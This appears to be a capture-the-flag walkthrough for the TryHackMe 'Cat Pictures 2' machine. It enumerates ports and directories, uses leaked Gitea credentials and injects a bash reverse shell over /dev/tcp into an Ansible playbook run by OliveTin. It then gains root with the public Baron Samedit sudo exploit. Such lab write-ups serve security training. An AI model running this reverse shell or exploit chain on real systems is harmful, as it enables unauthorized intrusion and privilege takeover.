---
title: "Cat Pictures 2 machine on THM"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/cat_pictures_2.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Everybody love cats... or not! Especially if the cute cat pictures is hiding a vulnerability meant to ruin your web app. This machine contains a vulnerability hidden in Gitea versioning."
description: "Walkthrough on Cat Pictures 2 machine from TryHackMe"
categories:
  - writeups
tags:
  - gitea
  - version
  - THM
  - CTF
  - writeup
  - TryHackMe
  - Easy
toc: false
---
# Cat Pictures 2

<img src="/assets/images/posts/writeups/cat_pictures_2.jpg" alt="Cat Pictures 2" width="500" class="align-center">

Everybody love cats... or not! Especially if the cute cat pictures is hiding a vulnerability meant to ruin your web app. This machine contains a vulnerability hidden in Gitea versioning.

## Information gathering

### Enumeration

#### nmap

Command:
```sh
sudo nmap -sC -sV -A -sS -p- 10.10.122.48
```

Results
```sh
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
|_http-title: Lychee
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
| http-git: 
|   10.10.137.187:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-server-header: nginx/1.4.6 (Ubuntu)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
|_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 3858
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 06 Jul 2023 08:43:38 GMT
|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>OliveTin</title>
|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
|     </head>
|     <body>
|     <main title = "main content">
|     <fieldset id = "section-switcher" title = "Sections">
|     <button id = "showActions">Actions</button>
|_    <button id = "showLogs">Logs</but
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=359e8de146176b5b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=bBSKA4hX0w_76HfkNie8IyUOLF06MTY4ODYzMzAxODYwOTkyMTE4NQ; Path=/; Expires=Fri, 07 Jul 2023 08:43:38 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 06 Jul 2023 08:43:38 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=e82cbb65ea540a07; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=voXkweKRL6FLRK7oGnbJijzO1as6MTY4ODYzMzAyMzkxMTgxNzI0NQ; Path=/; Expires=Fri, 07 Jul 2023 08:43:43 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 06 Jul 2023 08:43:43 GMT
|_    Content-Length: 0
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :


```
#### gobuster

Command:
```sh
gobuster dir -u http://10.10.122.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results:
```sh
/docs                 (Status: 301) [Size: 193] [--> http://10.10.122.48/docs/]
/uploads              (Status: 301) [Size: 193] [--> http://10.10.122.48/uploads/]
/data                 (Status: 301) [Size: 193] [--> http://10.10.122.48/data/]
/php                  (Status: 301) [Size: 193] [--> http://10.10.122.48/php/]
/plugins              (Status: 301) [Size: 193] [--> http://10.10.122.48/plugins/]
/src                  (Status: 301) [Size: 193] [--> http://10.10.122.48/src/]
/dist                 (Status: 301) [Size: 193] [--> http://10.10.122.48/dist/]
/LICENSE              (Status: 200) [Size: 1105]

```

#### dirb

Command:
```sh
dirb http://10.10.122.48
```

Results
```sh
---- Scanning URL: http://10.10.122.48/ ----
+ http://10.10.122.48/.git/HEAD (CODE:200|SIZE:23)
+ http://10.10.122.48/.htaccess (CODE:200|SIZE:630)
==> DIRECTORY: http://10.10.122.48/data/
==> DIRECTORY: http://10.10.122.48/dist/
==> DIRECTORY: http://10.10.122.48/docs/
+ http://10.10.122.48/favicon.ico (CODE:200|SIZE:33412)
+ http://10.10.122.48/index.html (CODE:200|SIZE:60906)
+ http://10.10.122.48/LICENSE (CODE:200|SIZE:1105)
==> DIRECTORY: http://10.10.122.48/php/
==> DIRECTORY: http://10.10.122.48/plugins/
+ http://10.10.122.48/robots.txt (CODE:200|SIZE:136)
==> DIRECTORY: http://10.10.122.48/src/
==> DIRECTORY: http://10.10.122.48/uploads/
---- Entering directory: http://10.10.122.48/data/ ----
---- Entering directory: http://10.10.122.48/dist/ ----
---- Entering directory: http://10.10.122.48/docs/ ----
---- Entering directory: http://10.10.122.48/php/ ----
==> DIRECTORY: http://10.10.122.48/php/database/
==> DIRECTORY: http://10.10.122.48/php/helpers/
+ http://10.10.122.48/php/index.php (CODE:200|SIZE:35)
---- Entering directory: http://10.10.122.48/plugins/ ----
==> DIRECTORY: http://10.10.122.48/plugins/Log/    
```

Command:
```sh
dirb http://10.10.122.48:3000
```

Results
```sh
---- Scanning URL: http://10.10.122.48:3000/ ----
+ http://10.10.122.48:3000/admin (CODE:303|SIZE:38)                                                                                           
+ http://10.10.122.48:3000/explore (CODE:303|SIZE:41)                                                                                         
+ http://10.10.122.48:3000/favicon.ico (CODE:301|SIZE:58)                                                                                     
+ http://10.10.122.48:3000/issues (CODE:303|SIZE:38)                                                                                          
+ http://10.10.122.48:3000/notifications (CODE:303|SIZE:38)                                                                                   
+ http://10.10.122.48:3000/v2 (CODE:401|SIZE:50)    
```


## Exploitation

### Foothold
1. Getting more information on *Gitea* from [[https://cloud.hacktricks.xyz/pentesting-ci-cd/gitea-security#unauthenticated-enumeration|here]] we can see there is a path where the users can be searched by default: /explore/users
2. Checking the above location we discovered user: *samarium*
3. Download all the pictures in the and check the EXIF using *exiftool*. One of the picture has the path: *:8080/764efa883dda1e11db47671c4a3bbd9e.txt*

```txt
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

#### Data exfiltration

1. Using the above username and password we can login to gitea app and check the repo samarium/ansible, here is the first flag: *[FirstFlag]*
2. In the same repo we can change the "command" tag in the yaml file ansible/playbook.yaml to "cat flag2.txt" and run the ansible script from 10.10.212.255:1337 to get second flag: *[SecondFlag]*
3. Again modify the .yaml file and insert the revshell command as bellow and run ansible script again after setting up a a listener
```yaml
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: bash -c 'bash -i >& /dev/tcp/10.8.35.41/4455 0>&1'
```

### Privilege escalation
1. Go to /tmp folder and download from attacking machine leanpeas.sh
2. After running linpeas we can see is vulnerable to Exploit CVE-2021–3156 (Baron Samedit)
3. Download the exploit from [[https://github.com/blasty/CVE-2021-3156|github]] and and move it to victim machine using:
```sh
wget — —recursive — —no-parent [http://yourkaliattackip/CVE-2021-3156](http://10.14.34.171/CVE-2021-3156)  #command to copy from attacking machine

cd /youipdirectory  
cd /CVE-2021–3156  
make  
./sudo-hax-me-a-sandwich 0
```

#### Data exfiltration
1. As now you are root, go to /root/flag3.txt and get the last flag: *[ThirdFlag]*